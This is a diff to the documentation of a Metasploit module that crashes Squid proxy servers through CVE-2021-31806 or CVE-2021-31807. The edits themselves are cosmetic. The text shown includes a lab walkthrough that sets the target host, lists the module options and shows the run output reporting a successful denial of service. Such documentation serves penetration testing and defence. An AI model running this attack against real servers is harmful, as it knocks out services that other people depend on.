@@ -26,9 +26,9 @@ Security bulletin from Squid: https://github.com/squid-cache/squid/security/advi
 
 ### REQUEST_COUNT
 
-REQUEST_COUNT is both the the number of HTTP requests which are sent to the server in
-order to perform the actual Denial of Service (i.e. accepted requests by the server), 
-and the number of requests that are sent to confirm that the Squid host is actually 
+REQUEST_COUNT is both the number of HTTP requests which are sent to the server in
+order to perform the actual Denial of Service (i.e. accepted requests by the server),
+and the number of requests that are sent to confirm that the Squid host is actually
 dead.
 
 ### CVE
@@ -40,12 +40,12 @@ The default setting is `CVE-2021-31806`, but `CVE-2021-31807` can also be chosen
 
 In this scenario the target server is running on the same host as Metasploit (192.168.159.128).
 ```
-msf6 > use auxiliary/dos/http/squid_range_dos i
-msf6 auxiliary(dos/http/squid_range_dos) > set RHOSTS 192.168.159.128
+msf > use auxiliary/dos/http/squid_range_dos i
+msf auxiliary(dos/http/squid_range_dos) > set RHOSTS 192.168.159.128
 RHOSTS => 192.168.159.128
-msf6 auxiliary(dos/http/squid_range_dos) > set SRVHOST 192.168.159.128
+msf auxiliary(dos/http/squid_range_dos) > set SRVHOST 192.168.159.128
 SRVHOST => 192.168.159.128
-msf6 auxiliary(dos/http/squid_range_dos) > show options 
+msf auxiliary(dos/http/squid_range_dos) > show options
 
 Module options (auxiliary/dos/http/squid_range_dos):
 
@@ -54,7 +54,7 @@ Module options (auxiliary/dos/http/squid_range_dos):
    CVE            CVE-2021-31806   yes       CVE to check/exploit (Accepted: CVE-2021-31806, CVE-2021-31807)
    Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
    REQUEST_COUNT  50               yes       The number of requests to be sent, as well as the number of re-tries to confirm a dead host
-   RHOSTS         192.168.159.128  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RHOSTS         192.168.159.128  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
    RPORT          3128             yes       The target port (TCP)
    SRVHOST        192.168.159.128  yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
    SRVPORT        8080             yes       The local port to listen on.
@@ -71,7 +71,7 @@ Auxiliary action:
    DOS   Perform Denial of Service Against The Target
 
 
-msf6 auxiliary(dos/http/squid_range_dos) > run
+msf auxiliary(dos/http/squid_range_dos) > run
 [*] Running module against 192.168.159.128
 
 [*] Sending 50 DoS requests to 192.168.159.128:3128
@@ -85,8 +85,8 @@ msf6 auxiliary(dos/http/squid_range_dos) > run
 [+] DoS completely successful.
 [*] Server stopped.
 [*] Auxiliary module execution completed
-msf6 auxiliary(dos/http/squid_range_dos) >
+msf auxiliary(dos/http/squid_range_dos) >
 ```
 
-At this point, the target Squid server should be completely inaccessible: all children 
+At this point, the target Squid server should be completely inaccessible: all children
 workers should have exited, and the main process should have also shut down.
